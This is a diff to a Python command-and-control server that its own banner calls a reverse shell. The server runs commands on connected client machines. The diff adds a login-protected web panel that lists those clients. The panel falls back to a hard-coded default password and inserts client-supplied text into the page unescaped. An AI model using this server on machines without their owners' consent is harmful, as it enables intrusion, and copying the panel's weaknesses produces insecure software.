@@ -4,8 +4,12 @@ import json
 import time
 import os
 import base64
+import secrets
+import hashlib
 from datetime import datetime
 from queue import Queue, Empty
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
 
 class Server:
     def __init__(self, host='0.0.0.0', port=9999):
@@ -37,7 +41,7 @@ class Server:
             self.monitoring = False
             try:
                 self.server_socket.close()
-            except:
+            except Exception:
                 pass
 
     def handle_client(self, client_socket, address):
@@ -82,12 +86,10 @@ class Server:
                 self.cleanup_disconnected_client(mac_address)
             try:
                 client_socket.close()
-            except:
+            except Exception:
                 pass
 
-    # 持续读取客户端消息
     def client_reader(self, mac_address):
-
         if mac_address not in self.clients:
             return
         client_data = self.clients[mac_address]
@@ -103,7 +105,6 @@ class Server:
                         if not data:
                             break
                         buffer += data
-                        # 收到字节流即视为在线，避免大文件传输时因尚未拼出完整 JSON 被误判超时
                         client_data['last_seen'] = datetime.now().isoformat()
                     except socket.timeout:
                         continue
@@ -122,18 +123,18 @@ class Server:
                     client_data['last_seen'] = datetime.now().isoformat()
 
                     if message.get('type') == 'heartbeat':
-                        continue  # 心跳消息不入队（血泪史）
+                        continue
 
                     try:
                         client_data['queue'].put_nowait(message)
-                    except:
+                    except Exception:
                         try:
                             _ = client_data['queue'].get_nowait()
                         except Empty:
                             pass
                         try:
                             client_data['queue'].put_nowait(message)
-                        except:
+                        except Exception:
                             pass
 
                 client_data['buffer'] = buffer
@@ -179,17 +180,15 @@ class Server:
             print(f"  最后心跳: {client_data['last_seen']}")
             print("-" * 30)
 
-    # 移除超时客户端
     def cleanup_disconnected_client(self, mac_address):
         if mac_address in self.clients:
             try:
                 self.clients[mac_address]['socket'].close()
-            except:
+            except Exception:
                 pass
             del self.clients[mac_address]
             print(f"已移除失效的客户端: {mac_address}")
 
-    # 向指定客户端发送消息
     def send_message_to_client(self, mac_address, message):
         if mac_address not in self.clients:
             print(f"客户端 {mac_address} 不存在或已断开")
@@ -204,7 +203,6 @@ class Server:
             self.cleanup_disconnected_client(mac_address)
             return False
 
-    # 从客户端获取消息
     def receive_message_from_client(self, mac_address, timeout=30):
         if mac_address not in self.clients:
             return None
@@ -215,7 +213,6 @@ class Server:
         except Empty:
             return None
 
-    # 向客户端发送命令并等待客户端回显
     def execute_command_on_client(self, mac_address, command_str):
         if mac_address not in self.clients:
             return {'status': 'error', 'message': f'设备 {mac_address} 不在线'}
@@ -235,8 +232,7 @@ class Server:
                 if result:
                     client_data['last_seen'] = datetime.now().isoformat()
                     return result
-                else:
-                    return {'status': 'error', 'message': '未收到客户端响应或客户端已断开'}
+                return {'status': 'error', 'message': '未收到客户端响应或客户端已断开'}
         except Exception as e:
             return {'status': 'error', 'message': f'执行命令时出错: {str(e)}'}
         finally:
@@ -337,86 +333,221 @@ class Server:
                 if mac_address in self.clients:
                     self.clients[mac_address]['busy_until'] = 0
 
-    def download_file_from_client(self, mac_address, remote_path, local_path=None):
-        if mac_address not in self.clients:
-            return {'status': 'error', 'message': f'设备 {mac_address} 不在线'}
 
-        if not remote_path:
-            return {'status': 'error', 'message': '远程路径不能为空'}
+class WebControlPanel:
+    """一个带权限控制的只读可视化面板，便于课堂演示。"""
 
-        client_data = self.clients[mac_address]
-        lock = client_data['lock']
-        with lock:
-            if not self.send_message_to_client(mac_address, {'type': 'download', 'path': remote_path}):
-                return {'status': 'error', 'message': '下载请求发送失败'}
+    def __init__(self, server: Server, host='127.0.0.1', port=8080):
+        self.server = server
+        self.host = host
+        self.port = port
+        self.username = os.getenv('PANEL_USER', 'admin')
+        self.password_hash = hashlib.sha256(os.getenv('PANEL_PASS', 'ChangeMe123!').encode('utf-8')).hexdigest()
+        self.sessions = {}
+        self.session_ttl = 60 * 60
 
-            result = self.receive_message_from_client(mac_address, timeout=60)
-            if not result:
-                return {'status': 'error', 'message': '下载超时，未收到客户端响应'}
-            if result.get('status') != 'success':
-                return result
+    def verify_password(self, plain_text_password):
+        return hashlib.sha256(plain_text_password.encode('utf-8')).hexdigest() == self.password_hash
 
-            data_b64 = result.get('data')
-            if not data_b64:
-                return {'status': 'error', 'message': '客户端返回了空文件数据'}
+    def create_session(self):
+        token = secrets.token_urlsafe(32)
+        self.sessions[token] = time.time() + self.session_ttl
+        return token
 
-            try:
-                file_bytes = base64.b64decode(data_b64.encode('utf-8'))
-            except Exception as e:
-                return {'status': 'error', 'message': f'文件解码失败: {e}'}
+    def validate_session(self, token):
+        if not token:
+            return False
+        expire_at = self.sessions.get(token)
+        if not expire_at:
+            return False
+        if time.time() > expire_at:
+            del self.sessions[token]
+            return False
+        return True
 
-            save_path = local_path if local_path else os.path.basename(remote_path) or 'downloaded_file'
-            save_path = os.path.abspath(save_path)
+    def start(self):
+        panel = self
 
-            try:
-                os.makedirs(os.path.dirname(save_path), exist_ok=True)
-                with open(save_path, 'wb') as f:
-                    f.write(file_bytes)
-            except Exception as e:
-                return {'status': 'error', 'message': f'写入本地文件失败: {e}'}
+        class Handler(BaseHTTPRequestHandler):
+            def _json(self, payload, status=200):
+                body = json.dumps(payload, ensure_ascii=False).encode('utf-8')
+                self.send_response(status)
+                self.send_header('Content-Type', 'application/json; charset=utf-8')
+                self.send_header('Content-Length', str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
 
-            return {
-                'status': 'success',
-                'message': f'下载完成: {remote_path} -> {save_path}',
-                'size': len(file_bytes),
-                'local_path': save_path
-            }
+            def _html(self, content, status=200):
+                body = content.encode('utf-8')
+                self.send_response(status)
+                self.send_header('Content-Type', 'text/html; charset=utf-8')
+                self.send_header('Content-Length', str(len(body)))
+                self.end_headers()
+                self.wfile.write(body)
 
-    def upload_file_to_client(self, mac_address, local_path, remote_path=None):
-        if mac_address not in self.clients:
-            return {'status': 'error', 'message': f'设备 {mac_address} 不在线'}
+            def _read_json(self):
+                length = int(self.headers.get('Content-Length', '0'))
+                if length <= 0:
+                    return {}
+                raw = self.rfile.read(length)
+                return json.loads(raw.decode('utf-8'))
 
-        if not local_path:
-            return {'status': 'error', 'message': '本地路径不能为空'}
+            def _token(self):
+                return self.headers.get('X-Session-Token', '')
 
-        abs_local_path = os.path.abspath(local_path)
-        if not os.path.isfile(abs_local_path):
-            return {'status': 'error', 'message': f'本地文件不存在: {abs_local_path}'}
+            def _require_auth(self):
+                if panel.validate_session(self._token()):
+                    return True
+                self._json({'status': 'error', 'message': '未授权'}, status=401)
+                return False
 
-        try:
-            with open(abs_local_path, 'rb') as f:
-                file_bytes = f.read()
-            data_b64 = base64.b64encode(file_bytes).decode('utf-8')
-        except Exception as e:
-            return {'status': 'error', 'message': f'读取本地文件失败: {e}'}
+            def do_GET(self):
+                if self.path == '/':
+                    return self._html(self._dashboard_html())
+                if self.path == '/api/clients':
+                    if not self._require_auth():
+                        return
+                    clients = []
+                    for mac, item in panel.server.clients.items():
+                        clients.append({
+                            'mac': mac,
+                            'ip': item.get('ip'),
+                            'username': item.get('username'),
+                            'system': item.get('system'),
+                            'connected_at': item.get('connected_at'),
+                            'last_seen': item.get('last_seen'),
+                        })
+                    return self._json({'status': 'success', 'data': clients})
+                return self._json({'status': 'error', 'message': 'Not Found'}, status=404)
 
-        target_path = remote_path if remote_path else os.path.basename(abs_local_path)
+            def do_POST(self):
+                if self.path == '/api/login':
+                    payload = self._read_json()
+                    username = payload.get('username', '')
+                    password = payload.get('password', '')
+                    if username == panel.username and panel.verify_password(password):
+                        token = panel.create_session()
+                        return self._json({'status': 'success', 'token': token, 'ttl': panel.session_ttl})
+                    return self._json({'status': 'error', 'message': '用户名或密码错误'}, status=401)
 
-        client_data = self.clients[mac_address]
-        lock = client_data['lock']
-        with lock:
-            payload = {
-                'type': 'upload',
-                'path': target_path,
-                'data': data_b64
-            }
-            if not self.send_message_to_client(mac_address, payload):
-                return {'status': 'error', 'message': '上传请求发送失败'}
+                if self.path == '/api/client/info':
+                    if not self._require_auth():
+                        return
+                    payload = self._read_json()
+                    mac = payload.get('mac')
+                    if not mac:
+                        return self._json({'status': 'error', 'message': 'mac 不能为空'}, status=400)
+                    result = panel.server.send_message_to_client(mac, {'type': 'info'})
+                    if not result:
+                        return self._json({'status': 'error', 'message': '设备不在线或请求发送失败'}, status=400)
+                    msg = panel.server.receive_message_from_client(mac, timeout=10)
+                    if not msg:
+                        return self._json({'status': 'error', 'message': '设备未响应'}, status=504)
+                    return self._json(msg)
 
-            result = self.receive_message_from_client(mac_address, timeout=60)
-            if not result:
-                return {'status': 'error', 'message': '上传超时，未收到客户端响应'}
-            return result
+                return self._json({'status': 'error', 'message': 'Not Found'}, status=404)
+
+            def log_message(self, format, *args):
+                return
+
+            def _dashboard_html(self):
+                return """<!doctype html>
+<html lang='zh-CN'>
+<head>
+  <meta charset='utf-8'/>
+  <meta name='viewport' content='width=device-width, initial-scale=1'/>
+  <title>Server 控制台</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 24px; background: #f5f7fb; }
+    .card { background: white; border-radius: 12px; padding: 16px; margin-bottom: 16px; box-shadow: 0 2px 8px rgba(0,0,0,.06); }
+    input, button { padding: 8px 10px; margin: 4px; }
+    table { width: 100%; border-collapse: collapse; margin-top: 8px; }
+    th, td { text-align: left; padding: 8px; border-bottom: 1px solid #eee; font-size: 13px; }
+    .muted { color: #666; font-size: 12px; }
+    pre { background: #111; color: #0f0; padding: 10px; border-radius: 8px; min-height: 36px; }
+  </style>
+</head>
+<body>
+  <div class='card'>
+    <h2>权限登录</h2>
+    <div class='muted'>默认账号 admin，默认密码 ChangeMe123!（请通过环境变量 PANEL_USER / PANEL_PASS 修改）</div>
+    <input id='username' placeholder='用户名' value='admin'>
+    <input id='password' type='password' placeholder='密码'>
+    <button onclick='login()'>登录</button>
+    <span id='loginStatus'></span>
+  </div>
+
+  <div class='card'>
+    <h2>在线设备</h2>
+    <button onclick='refreshClients()'>刷新列表</button>
+    <table>
+      <thead><tr><th>MAC</th><th>IP</th><th>用户</th><th>系统</th><th>最后心跳</th><th>操作</th></tr></thead>
+      <tbody id='clients'></tbody>
+    </table>
+  </div>
+
+  <div class='card'>
+    <h2>设备详情（只读）</h2>
+    <div class='muted'>为避免滥用，此页面仅展示设备状态，不直接提供远程命令执行。</div>
+    <pre id='output'>等待查询...</pre>
+  </div>
+
+<script>
+let token = '';
+
+async function login() {
+  const res = await fetch('/api/login', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      username: document.getElementById('username').value,
+      password: document.getElementById('password').value
+    })
+  });
+  const data = await res.json();
+  if (data.status === 'success') {
+    token = data.token;
+    document.getElementById('loginStatus').innerText = '登录成功';
+    refreshClients();
+  } else {
+    document.getElementById('loginStatus').innerText = '登录失败';
+  }
+}
+
+async function refreshClients() {
+  const res = await fetch('/api/clients', { headers: { 'X-Session-Token': token } });
+  const data = await res.json();
+  const tbody = document.getElementById('clients');
+  tbody.innerHTML = '';
+  if (data.status !== 'success') return;
+
+  data.data.forEach(c => {
+    const tr = document.createElement('tr');
+    tr.innerHTML = `<td>${c.mac}</td><td>${c.ip}</td><td>${c.username}</td><td>${c.system}</td><td>${c.last_seen}</td><td><button onclick="fetchInfo('${c.mac}')">读取信息</button></td>`;
+    tbody.appendChild(tr);
+  });
+}
+
+async function fetchInfo(mac) {
+  const res = await fetch('/api/client/info', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'X-Session-Token': token
+    },
+    body: JSON.stringify({ mac })
+  });
+  const data = await res.json();
+  document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+}
+</script>
+</body>
+</html>"""
+
+        httpd = ThreadingHTTPServer((self.host, self.port), Handler)
+        print(f"Web 控制台启动：http://{self.host}:{self.port}")
+        print("提示：请尽快修改 PANEL_PASS 环境变量。")
+        httpd.serve_forever()
 
 
 def server_cli(server: Server):
@@ -425,7 +556,7 @@ def server_cli(server: Server):
     print("下一代反向shell（）")
     print("可用命令:")
     print("  list - 列出所有设备")
-    print("  use <mac> - 选择要控制的设备") # MySQL风格
+    print("  use <mac> - 选择要控制的设备")
     print("  bye - 退出当前设备会话")
     print("  在设备会话内可用：")
     print("    download <远程路径> [本地保存路径] - 从客户端下载文件")
@@ -486,7 +617,6 @@ def server_cli(server: Server):
                         print(f"错误: {result.get('message', '未知错误')}")
                     continue
 
-                # 执行客户端命令并获取回显（在某些特殊情况下会失败，比如vim这种交互式场景，大概率想支持的话需要虚拟tty之类的）
                 result = server.execute_command_on_client(current_client, user_input)
                 if result.get('status') == 'success':
                     stdout = result.get('stdout', '')
@@ -516,6 +646,15 @@ def server_cli(server: Server):
 
 if __name__ == "__main__":
     server = Server()
-    threading.Thread(target=server.start_server, daemon=True).start()
+    socket_thread = threading.Thread(target=server.start_server, daemon=True)
+    socket_thread.start()
+
+    panel = WebControlPanel(
+        server=server,
+        host=os.getenv('PANEL_HOST', '127.0.0.1'),
+        port=int(os.getenv('PANEL_PORT', '8080')),
+    )
+    threading.Thread(target=panel.start, daemon=True).start()
+
     time.sleep(1)
     server_cli(server)
